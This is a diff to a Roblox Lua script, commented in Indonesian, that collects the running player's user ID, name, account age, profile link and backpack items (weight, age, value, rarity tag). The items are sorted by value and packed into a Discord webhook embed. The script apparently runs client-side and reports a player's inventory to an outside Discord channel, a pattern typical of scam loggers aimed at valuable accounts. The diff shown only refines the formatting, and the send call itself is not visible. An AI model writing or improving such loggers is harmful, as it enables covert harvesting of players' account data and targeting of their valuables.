@@ -1,22 +1,50 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
+-- Custom function to format numbers with commas
+local function formatNumberWithCommas(n)
+    local left,num,right = string.match(tostring(n), '^([^%d]*%d)(%d*)(.-)$')
+    return left..(num:reverse():gsub('(%d%d%d)', '%1,'):reverse())..right
+end
+
 local player = Players.LocalPlayer
 local userId = player.UserId
 local playerName = player.Name
 local accountAge = player.AccountAge -- umur akun dalam hari
 local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
 
--- Kumpulkan isi backpack (nama tool)
+-- Kumpulkan isi backpack (format seperti di gambar)
 local backpack = player:WaitForChild("Backpack")
 local backpackItems = {}
 for _, item in ipairs(backpack:GetChildren()) do
-    table.insert(backpackItems, item.Name)
+    -- Format: "Item Name [Weight] [Age] → Value#"
+    local weight = string.format("%.2f KG", item:GetAttribute("Weight") or 0)
+    local age = item:GetAttribute("Age") or 1
+    local value = item:GetAttribute("Value") or 0
+    local formattedValue = formatNumberWithCommas(value) .. "#"
+    
+    -- Handle special [Celestial] tag if present
+    local itemName = item.Name
+    if item:GetAttribute("IsCelestial") then
+        itemName = "[Celestial] " .. itemName
+    end
+    
+    table.insert(backpackItems, string.format("%s [%s] [Age %d] → %s", 
+        itemName, weight, age, formattedValue))
 end
-local backpackStr = #backpackItems > 0 and table.concat(backpackItems, ", ") or "Kosong"
 
--- Batasi panjang string agar tidak melebihi batas embed Discord (~1024 karakter)
-local maxLength = 1000
+-- Urutkan berdasarkan nilai terbesar ke terkecil (seperti di gambar)
+table.sort(backpackItems, function(a, b)
+    local valueA = tonumber(string.match(a, "→ ([%d,]+)#"):gsub(",", "")) or 0
+    local valueB = tonumber(string.match(b, "→ ([%d,]+)#"):gsub(",", "")) or 0
+    return valueA > valueB
+end)
+
+-- Gabungkan dengan format baris baru
+local backpackStr = #backpackItems > 0 and table.concat(backpackItems, "\n") or "Kosong"
+
+-- Batasi panjang string agar tidak melebihi batas embed Discord (~4000 karakter)
+local maxLength = 3000
 if #backpackStr > maxLength then
     backpackStr = string.sub(backpackStr, 1, maxLength - 3) .. "..."
 end
@@ -83,7 +111,7 @@ local webhookPayload = {
             },
             {
                 ["name"] = "🎒 Isi Backpack",
-                ["value"] = backpackStr,
+                ["value"] = "```\n" .. backpackStr .. "\n```", -- Format sebagai code block
                 ["inline"] = false
             }
         },
